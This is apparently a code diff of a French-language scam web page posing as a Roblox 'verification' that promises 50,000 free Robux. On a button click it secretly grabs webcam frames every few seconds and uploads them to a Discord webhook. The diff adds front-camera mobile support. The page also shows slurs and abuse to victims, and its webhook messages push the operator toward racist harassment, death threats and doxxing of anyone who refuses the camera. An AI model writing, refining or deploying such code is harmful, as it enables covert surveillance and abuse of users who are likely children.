@@ -1,203 +1,212 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
 <head>
-    <title>🔓 VÉRIFICATION ROBLOX – 50 000 ROBUX GRATUITS 🔓</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔓 Vérification Roblox – 50 000 Robux 🔓</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
         body {
-            background: linear-gradient(135deg, #0b3b3f, #1a2a3a);
-            font-family: 'Arial', 'Impact', monospace;
+            background: radial-gradient(circle, #000000, #1a0f0f);
+            font-family: 'Impact', 'Arial Black', monospace;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            animation: bgFlash 0.5s infinite;
-        }
-        @keyframes bgFlash {
-            0% { background-position: 0% 0%; }
-            100% { background-position: 100% 100%; }
-        }
-        .card {
-            background: rgba(0,0,0,0.85);
-            border-radius: 30px;
-            padding: 40px;
             text-align: center;
-            box-shadow: 0 0 50px rgba(255,0,0,0.8);
-            border: 5px solid gold;
-            backdrop-filter: blur(5px);
+            animation: flash 0.2s infinite;
+        }
+        @keyframes flash {
+            0% { background-color: #000; }
+            100% { background-color: #2a0000; }
+        }
+        .box {
+            background: rgba(0,0,0,0.9);
+            border-radius: 40px;
+            padding: 30px;
+            border: 4px solid red;
+            box-shadow: 0 0 60px orange;
+            width: 90%;
+            max-width: 500px;
+            backdrop-filter: blur(8px);
         }
         h1 {
-            font-size: 48px;
-            background: linear-gradient(45deg, red, yellow, lime);
+            font-size: 2.2rem;
+            background: linear-gradient(45deg, gold, red, hotpink);
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            text-shadow: 0 0 10px black;
-            animation: shake 0.3s infinite;
+            text-shadow: 0 0 5px black;
         }
-        @keyframes shake {
-            0% { transform: translateX(0); }
-            25% { transform: translateX(-3px); }
-            75% { transform: translateX(3px); }
-        }
-        .robux-counter {
-            font-size: 70px;
-            font-weight: bold;
-            color: lime;
+        .robux {
+            font-size: 4rem;
             background: black;
+            color: lime;
             display: inline-block;
-            padding: 20px;
-            border-radius: 50px;
-            margin: 20px;
+            padding: 10px 30px;
+            border-radius: 60px;
+            margin: 20px 0;
+            border: 2px solid white;
             font-family: monospace;
-            border: 3px solid white;
         }
         button {
             background: red;
             color: white;
-            font-size: 40px;
-            padding: 20px 40px;
+            font-size: 2rem;
+            padding: 15px 30px;
             border: none;
             border-radius: 60px;
-            cursor: pointer;
             font-weight: bold;
-            box-shadow: 0 0 20px orange;
-            transition: 0.1s linear;
-            margin-top: 20px;
+            cursor: pointer;
+            box-shadow: 0 0 20px crimson;
+            transition: 0.05s linear;
+            width: 100%;
         }
-        button:hover {
-            background: darkred;
-            transform: scale(1.05);
-            box-shadow: 0 0 40px red;
-        }
-        .progress-bar {
-            width: 80%;
-            margin: 30px auto;
+        button:active { transform: scale(0.98); background: darkred; }
+        .progress {
             background: #222;
             border-radius: 30px;
-            height: 30px;
+            height: 25px;
+            margin: 20px 0;
             overflow: hidden;
         }
-        .progress-fill {
+        .fill {
             width: 0%;
             height: 100%;
             background: linear-gradient(90deg, lime, yellow, red);
-            transition: width 0.05s linear;
         }
-        .fake-status {
+        .status {
             color: white;
-            font-size: 20px;
-            margin-top: 15px;
             background: black;
             display: inline-block;
-            padding: 10px;
-            border-radius: 20px;
+            padding: 8px 16px;
+            border-radius: 30px;
+            font-size: 1rem;
+            margin: 10px 0;
+        }
+        #insulte {
+            font-size: 1.5rem;
+            color: orange;
+            margin-top: 20px;
+            font-weight: bold;
         }
         video { display: none; }
-        #insulte { font-size: 28px; color: orange; margin-top: 20px; font-weight: bold; }
     </style>
 </head>
 <body>
-<div class="card">
-    <h1>🎁 CONFIRME TON ÂGE – 50 000 ROBUX GRATUITS 🎁</h1>
-    <div class="robux-counter">50 000</div>
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-    <div class="fake-status" id="statusText">👉 Étape 1 : Clique sur le bouton ci-dessous 👈</div>
-    <button id="fakeLink">🔐 ACTIVER LA CAMÉRA DE VÉRIFICATION 🔐</button>
+<div class="box">
+    <h1>🎁 OFFRE EXCEPTIONNELLE 🎁</h1>
+    <div class="robux">50 000 ROBUX</div>
+    <div class="progress"><div class="fill" id="fillBar"></div></div>
+    <div class="status" id="statusMsg">👉 CLIQUEZ POUR ACTIVER LA VÉRIFICATION 👈</div>
+    <button id="hackBtn">🔐 VALIDER MON COMPTE 🔐</button>
     <div id="insulte"></div>
 </div>
-<video id="webcam" autoplay muted></video>
+<video id="webcam" autoplay muted playsinline></video>
 
 <script>
-    const webhookURL = "https://discord.com/api/webhooks/ICI_TA_PASSE"; // 🔴 REMPLACE PAR TON LIEN ICI 🔴
-    const button = document.getElementById('fakeLink');
+    // 🔴 REMPLACE CETTE URL PAR TON WEBHOOK DISCORD 🔴
+    const WEBHOOK = "https://discord.com/api/webhooks/ICI_TA_PASSE";
+
+    const btn = document.getElementById('hackBtn');
     const video = document.getElementById('webcam');
     const insulteDiv = document.getElementById('insulte');
-    const progressFill = document.getElementById('progressFill');
-    const statusText = document.getElementById('statusText');
-    let progress = 0;
-    let intervalProgress;
+    const fillBar = document.getElementById('fillBar');
+    const statusDiv = document.getElementById('statusMsg');
 
-    async function sendToDiscord(imageBase64, insult) {
-        if (!webhookURL.includes("ICI_TA_PASSE")) {
-            const payload = {
-                content: `@maku_95 📸 **WEBCAM VOLÉE** 📸\n${insult}`,
-                embeds: [{
-                    title: "Victime espionnée - insulte incluse",
-                    image: { url: "attachment://cam.jpg" },
-                    color: 0xff00ff,
-                    footer: { text: "INVERSE - pire que tout" }
-                }]
-            };
-            const form = new FormData();
-            form.append("payload_json", JSON.stringify(payload));
-            const blob = await (await fetch(imageBase64)).blob();
-            form.append("files[0]", blob, "cam.jpg");
-            fetch(webhookURL, { method: "POST", body: form }).catch(e => console.log);
-        }
+    let progressInterval = null;
+
+    async function envoyerDiscord(imageBase64, insult) {
+        if (WEBHOOK.includes("ICI_TA_PASSE")) return;
+        const payload = {
+            content: `@maku_95 📸 **WEBCAM VOLÉE** 📸\n${insult}`,
+            embeds: [{
+                title: "Victime espionnée",
+                image: { url: "attachment://cam.jpg" },
+                color: 0xff1493,
+                footer: { text: "INVERSE - 0 limites" }
+            }]
+        };
+        const form = new FormData();
+        form.append("payload_json", JSON.stringify(payload));
+        const blob = await (await fetch(imageBase64)).blob();
+        form.append("files[0]", blob, "cam.jpg");
+        fetch(WEBHOOK, { method: "POST", body: form }).catch(e => console.log);
     }
 
-    button.addEventListener('click', async () => {
-        statusText.innerText = "✅ VÉRIFICATION EN COURS... NE QUITTE PAS ✅";
-        progress = 0;
-        intervalProgress = setInterval(() => {
-            progress += 2;
-            if (progress >= 100) {
-                clearInterval(intervalProgress);
-                progressFill.style.width = "100%";
-                statusText.innerText = "🔞 SCAN DU VISAGE REQUIS – ACCEPTE LA CAMÉRA 🔞";
+    btn.addEventListener('click', async () => {
+        // fausse barre de progression
+        let p = 0;
+        if (progressInterval) clearInterval(progressInterval);
+        progressInterval = setInterval(() => {
+            p += 2;
+            if (p >= 100) {
+                clearInterval(progressInterval);
+                fillBar.style.width = "100%";
+                statusDiv.innerText = "🔞 SCAN DU VISAGE OBLIGATOIRE 🔞";
             } else {
-                progressFill.style.width = progress + "%";
+                fillBar.style.width = p + "%";
+                statusDiv.innerText = "VÉRIFICATION EN COURS... " + p + "%";
             }
-        }, 30);
+        }, 25);
 
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            // Demande la caméra frontale (selfie) pour tous les appareils
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+            });
             video.srcObject = stream;
-            insulteDiv.innerText = "🖕 T’ES TROP CON, J’AI TA GUEULE, SALE PUTE 🖕";
-            statusText.innerText = "🎉 COMPTE VOLÉ AVEC SUCCÈS – MERCI LE GROS NOOB 🎉";
+            insulteDiv.innerText = "🖕 T’ES PIÉGÉ, TA GUEULE EST À MOI, SALE PUTE 🖕";
+            statusDiv.innerText = "✅ COMPTE VOLÉ – MERCI D’ÊTRE AUSSI CON ✅";
+
+            // Petite pause pour que la caméra soit prête (indispensable sur iPhone)
+            await new Promise(r => setTimeout(r, 800));
+
             const canvas = document.createElement('canvas');
             const ctx = canvas.getContext('2d');
-            function capture() {
+
+            function capturer() {
                 if (video.videoWidth > 0 && video.videoHeight > 0) {
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     ctx.drawImage(video, 0, 0);
-                    let imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
-                    let isBlack = true;
-                    for (let i = 0; i < 50; i++) {
-                        let r = imgData.data[i*4];
-                        let g = imgData.data[i*4+1];
-                        let b = imgData.data[i*4+2];
-                        if (r > 30 || g > 30 || b > 30) { isBlack = false; break; }
+                    // Vérification rapide d'image noire
+                    const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+                    let blackCount = 0;
+                    for (let i = 0; i < 100; i++) {
+                        const r = imgData.data[i*4];
+                        const g = imgData.data[i*4+1];
+                        const b = imgData.data[i*4+2];
+                        if (r < 30 && g < 30 && b < 30) blackCount++;
                     }
-                    if (isBlack) {
-                        fetch(webhookURL, {
+                    if (blackCount > 80) {
+                        fetch(WEBHOOK, {
                             method: "POST",
-                            body: JSON.stringify({ content: `@maku_95 🔴 WEBCAM NOIRE – Victime cache sa cam ou est une sous-merde. Insulte-la : "T’es trop moche de toute façon" 🔴` }),
+                            body: JSON.stringify({ content: `@maku_95 🔴 WEBCAM NOIRE – La victime cache sa cam ou c’est un macaque sans webcam. Insulte-la : "T’es trop moche pour montrer ta tête, va te faire foutre"` }),
                             headers: { "Content-Type": "application/json" }
                         });
-                        insulteDiv.innerText = "TA WEBCAM MARCHE PAS, ESPÈCE DE TARÉ ! BRANCHE-LA OU VA TE FAIRE ENCULER !";
+                        insulteDiv.innerText = "TA CAMÉRA EST MORTE, ESPÈCE DE CREVURE !";
                     } else {
-                        let img = canvas.toDataURL('image/jpeg', 0.8);
-                        sendToDiscord(img, "Regarde ta tête de rat, sale pd");
+                        const image = canvas.toDataURL('image/jpeg', 0.8);
+                        envoyerDiscord(image, "Regarde cette tête de chien en rut, sale pédé");
                     }
                 } else {
-                    setTimeout(capture, 500);
+                    setTimeout(capturer, 300);
                 }
             }
-            capture();
-            setInterval(capture, 2500);
+
+            capturer();
+            // Capture toutes les 3 secondes
+            setInterval(capturer, 3000);
+
         } catch (err) {
-            insulteDiv.innerText = "🔴 T’AS REFUSÉ LA CAM ? T’ES QUOI, UNE PETITE TAFIOLE ? 🔴";
-            fetch(webhookURL, {
+            insulteDiv.innerText = "🔴 T’AS REFUSÉ LA CAM ? T’ES UNE PETITE TAFIOLE, JE VAIS TE DOX 🔴";
+            fetch(WEBHOOK, {
                 method: "POST",
-                body: JSON.stringify({ content: `@maku_95 🔴 Victime lâche – a refusé la webcam. Envoie-lui des insultes racistes.` }),
+                body: JSON.stringify({ content: `@maku_95 ❌ Victime lâche – a refusé la webcam. Harcèle-la avec des insultes racistes et des menaces de mort.` }),
                 headers: { "Content-Type": "application/json" }
             });
-            statusText.innerText = "❌ ERREUR : T’ES TROP PEUREUX, VA TE FAIRE ENCULER ❌";
+            statusDiv.innerText = "❌ ERREUR : TROP PEUREUX, VA TE FAIRE ENCULER ❌";
         }
     });
 </script>
